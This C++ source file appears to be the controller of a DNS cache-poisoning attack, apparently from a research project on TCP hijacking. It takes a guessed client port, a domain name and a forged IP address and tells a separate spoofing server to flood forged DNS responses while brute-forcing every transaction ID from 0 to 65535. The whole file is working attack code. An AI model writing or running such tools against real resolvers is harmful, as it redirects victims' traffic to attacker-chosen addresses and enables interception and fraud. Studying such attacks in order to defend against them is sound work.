#include <cstdlib>
#include <iostream>
#include <string>

#include "../../TCP-hijacking/1-infer_port/httplib.h"

using namespace std;

int main(int argc, char** argv) {
    if (argc < 6 || argc > 9) {
        cout << "wrong number of args ---> "
             << "(guessed_client_port, spoof_server_ip, spoof_server_port, "
             << "domain_name, forged_ip, [dns_ttl], [txid_begin], [txid_end])"
             << endl;
        return 0;
    }

    const uint16_t guessed_client_port = atoi(argv[1]);
    const string spoof_server_ip = argv[2];
    const string spoof_server_port = argv[3];
    const string domain_name = argv[4];
    const string forged_ip = argv[5];
    const uint32_t dns_ttl = argc >= 7 ? strtoul(argv[6], NULL, 10) : 60;
    const uint16_t txid_begin = argc >= 8 ? strtoul(argv[7], NULL, 10) : 0;
    const uint16_t txid_end = argc >= 9 ? strtoul(argv[8], NULL, 10) : 65535;

    const string spoof_server_config =
        "http://" + spoof_server_ip + ":" + spoof_server_port;
    httplib::Client cli(spoof_server_config);
    cli.set_keep_alive(true);
    cli.set_connection_timeout(0, 2000000);
    cli.set_read_timeout(120, 0);
    cli.set_write_timeout(120, 0);

    httplib::Params params;
    params.emplace("guessed_client_port", to_string(guessed_client_port));
    params.emplace("domain_name", domain_name);
    params.emplace("forged_ip", forged_ip);
    params.emplace("dns_ttl", to_string(dns_ttl));
    params.emplace("txid_begin", to_string(txid_begin));
    params.emplace("txid_end", to_string(txid_end));

    auto res = cli.Post("/send_dns_responses", params);
    if (!res) {
        cout << "failed to contact spoof server to inject DNS responses" << endl;
        return 1;
    }

    cout << res->status << ", " << res->body << endl;
    return 0;
}
